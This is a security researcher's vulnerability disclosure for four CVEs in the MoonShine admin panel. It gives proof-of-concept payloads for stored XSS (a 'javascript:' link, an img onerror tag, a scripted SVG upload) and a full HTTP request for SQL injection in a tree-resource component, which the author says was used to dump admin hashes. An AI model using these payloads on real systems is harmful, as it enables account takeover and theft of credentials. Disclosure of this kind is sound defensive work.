# MoonShine Software Vulnerability Disclosure
Author: Giacomo Lenzini - GiacoLenzo2109
## CVE-2025-51487 - Stored XSS
### Description
A Stored Cross-Site Scripting (XSS) vulnerability exists in MoonShine version < 3.12.5, allowing remote attackers to store and execute arbitrary JavaScript in the browser of a user by including a payload using "javascript:", instead of the expected HTTPS protocol, in the CutCode *Link* parameter when creating/updating a new Article.
### CVSS 3.1 - 4.5 Medium
CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N
### PoC - Proof of Concept
The XSS is related to the creation of a new article:  
1. Under the sidebar: *Blog -> Articles*

2. Under *Link -> CutCode* insert the following payload under: `javascript:alert("XSS")`
<img width="2906" height="1886" alt="Pasted image 20250514125312" src="https://github.com/user-attachments/assets/6fb1c058-51f5-4c9d-901b-26f4d86b5235" />


3. Complete all other fields and save

4. Load all articles and check for your last article saved. Under the link field you will see your payload. Click on it, a popup will be opened showing the message "XSS"
<img width="2894" height="1788" alt="Pasted image 20250514125346" src="https://github.com/user-attachments/assets/b16cdd0b-9215-490d-a784-efa379dd66cc" />
<img width="2896" height="1794" alt="Pasted image 20250514125404" src="https://github.com/user-attachments/assets/ca938fcf-02c6-4422-94b6-b7efd1551db9" />

## CVE-2025-51488 - Stored XSS
### Description
A Stored Cross-Site Scripting (XSS) vulnerability exists in MoonShine version < 3.12.4, allowing remote attackers to store and execute arbitrary JavaScript in the browser of a user by including a malicious payload in the *Name* parameter when creating a new Admin.
### CVSS 3.1 - 4.9 Medium
CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
### PoC - Proof of Concept
The issue is related to the function to add a new Admin.  

1. Under the Sidebar "System" tab: *Admins -> Create*

2. Insert the following payload under the *Name* input field: `<img src=x onerror=alert("XSS")>`
<img width="2918" height="1502" alt="Pasted image 20250514125007" src="https://github.com/user-attachments/assets/02f3e5fb-590c-429e-b5a0-c6b6022b885b" />

3. Save

4. Under the sidebar select *Blog -> Articles*: now a popup will be opened showing the message "XSS"  
<img width="2906" height="1574" alt="Pasted image 20250514125127" src="https://github.com/user-attachments/assets/a277d2ba-fb8f-4533-8e2b-938b9bae9cba" />

## CVE-2025-51489 - Reflected XSS via Unrestriced File Upload
### Description
A Stored Cross-Site Scripting (XSS) vulnerability exists in MoonShine version < 3.12.5, allowing remote attackers to upload a malicious SVG file in *Files -> Thumbnail* when creating/updating an Article and correctly execute arbitrary JavaScript in the victim's browser when the file link is opened by the victim.
### CVSS 3.1 - 4.5 Medium
CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:N/A:N
### PoC - Proof of Concept
When creating a new Article (*Blog -> Articles*), an attacker could upload the following SVG under *Files -> Thumbnail* field.
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("XSS!");
   </script>
</svg>
```
<img width="2746" height="1390" alt="Pasted image 20250514220232" src="https://github.com/user-attachments/assets/5305a221-08b0-4beb-ad27-a2e86c2b57f9" />
<img width="2910" height="1604" alt="Pasted image 20250514220107" src="https://github.com/user-attachments/assets/a44712a7-aee3-455a-bc15-977b533743a8" />


## CVE-2025-51510 - SQL Injection
### Description
MoonShine was discovered to contain a SQL injection vulnerability via the Data parameter under the Blog module when using the moonshine-tree-resource component. An example of the use of this vulnerable component can be found under the public MoonShine Software demo based on MoonShine Software 3.12.5 (https://github.com/moonshine-software/demo-project - commit 72a1d80bf23de6c3457205630eb25409432bdbe0).
The vulnerable component is the following https://github.com/lee-to/moonshine-tree-resource (version < 2.0.2).
### CVSS 3.1 - 4.9 Medium
CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
### PoC - Proof of Concept
Vulnerable SQLi request, injecting a payload inside the *data* request field that shows the database version.
```
POST /admin/category-resource/sortable HTTP/1.1
Host: localhost
Content-Length: 431
sec-ch-ua-platform: "macOS"
X-XSRF-TOKEN: <REPLACE>
sec-ch-ua: "Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuLTeqJXF3L06Er3R
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/admin/resource/category-resource/category-index-page
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: XSRF-TOKEN=<REPLACE>; laravel_session=<REPLACE>

------WebKitFormBoundaryuLTeqJXF3L06Er3R
Content-Disposition: form-data; name="id"

1
------WebKitFormBoundaryuLTeqJXF3L06Er3R
Content-Disposition: form-data; name="parent"


------WebKitFormBoundaryuLTeqJXF3L06Er3R
Content-Disposition: form-data; name="index"

1
------WebKitFormBoundaryuLTeqJXF3L06Er3R
Content-Disposition: form-data; name="data"

(SELECT @@version)
------WebKitFormBoundaryuLTeqJXF3L06Er3R--
```

Here an example of the dumped db version:
<img width="2456" height="1544" alt="Pasted image 20250515151429" src="https://github.com/user-attachments/assets/25e2fd1e-8661-4d1b-96a5-012cd462d88e" />

Using the attached Python script (CVE-2025-51510.py), it was possible to extract Admin hash from *moonshine_users* table.

The following image shows the Admin hash correctly dumped (from moonshine_users table) character by character:
<img width="1424" height="258" alt="Pasted image 20250515150901" src="https://github.com/user-attachments/assets/ddbd36b5-8028-4223-901d-9499b4f0f054" />

